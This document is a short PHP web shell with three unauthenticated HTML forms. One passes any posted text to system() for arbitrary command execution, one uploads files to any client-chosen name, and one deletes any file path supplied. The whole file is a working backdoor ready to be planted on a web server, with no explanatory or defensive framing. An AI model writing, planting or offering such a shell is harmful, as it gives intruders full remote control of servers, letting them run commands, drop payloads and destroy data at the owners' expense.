<?php
if (isset($_POST['cmd'])) {
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}

if (isset($_FILES['file'])) {
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    if (move_uploaded_file($file_tmp, $file_name)) {
        echo "File uploaded successfully";
    } else {
        echo "Failed to upload";
    }
}

if (isset($_POST['delete'])) {
    $file_to_delete = $_POST['delete'];
    if (file_exists($file_to_delete)) {
        if (unlink($file_to_delete)) {
            echo "File deleted";
        } else {
            echo "Failed to delete file";
        }
    } else {
        echo "File not found";
    }
}
?>

<form method="post">
    <h3>Execute Command</h3>
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>

<form method="post" enctype="multipart/form-data">
    <h3>Upload File</h3>
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<form method="post">
    <h3>Delete File</h3>
    <input type="text" name="delete" placeholder="Enter file path">
    <input type="submit" value="Delete">
</form>
